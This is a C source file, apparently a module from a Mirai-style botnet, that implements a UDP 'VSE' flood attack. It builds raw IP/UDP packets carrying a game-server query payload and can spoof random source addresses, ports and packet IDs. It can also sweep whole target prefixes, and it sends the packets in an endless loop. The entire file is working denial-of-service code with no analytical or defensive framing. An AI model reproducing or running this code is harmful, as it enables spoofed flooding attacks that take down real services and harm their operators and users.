#define _GNU_SOURCE

#include "../../attack.h"
#include "../../../../utils/headers/resolver.h"

void flood_udpvse(struct flood *flood)
{
  int i, fd;
    char **pkts = calloc(flood->num_of_targets, sizeof(char *));

    char *vse_payload = enc[ATTACK_VSE].string;
    int vse_payload_len = strlen(vse_payload);

    if ((fd = sys_socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        debug("Failed to create raw socket. Aborting attack\n");
        return;
    }
    i = 1;
    if (sys_setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        debug("Failed to set IP_HDRINCL. Aborting\n");
        sys_close(fd);
        return;
    }

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(128, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version_ihl = (4 << 4) | 5;
        iph->tos = flood->settings->tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
        iph->id = htons(flood->settings->ident);
        iph->ttl = flood->settings->ttl;
        if (flood->settings->dont_fragment)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = flood->targets[i].addr;

        udph->source = htons(flood->settings->source_port);
        udph->dest = htons(flood->settings->dest_port);
        udph->len = htons(sizeof(struct udphdr) + 4 + vse_payload_len);

        *((uint32_t *)data) = 0xffffffff;
        data += sizeof(uint32_t);
        memcpy(data, vse_payload, vse_payload_len);
    }

    while (*flood->running)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            
            // Use local copy of target to avoid race conditions
            struct flood_target target = flood->targets[i];

            // For prefix attacks
            if (target.netmask < 32)
                iph->daddr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            if (flood->settings->source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (flood->settings->ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (flood->settings->source_port == 0xffff)
                udph->source = rand_next();
            if (flood->settings->dest_port == 0xffff)
                udph->dest = rand_next();

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp((uint8_t *)udph, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len, (uint8_t *)&iph->saddr, (uint8_t *)&iph->daddr);

            target.sock_addr.sin_port = udph->dest;
            sys_sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len, MSG_NOSIGNAL, (void *)&target.sock_addr, sizeof(struct sockaddr_in));
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }

}
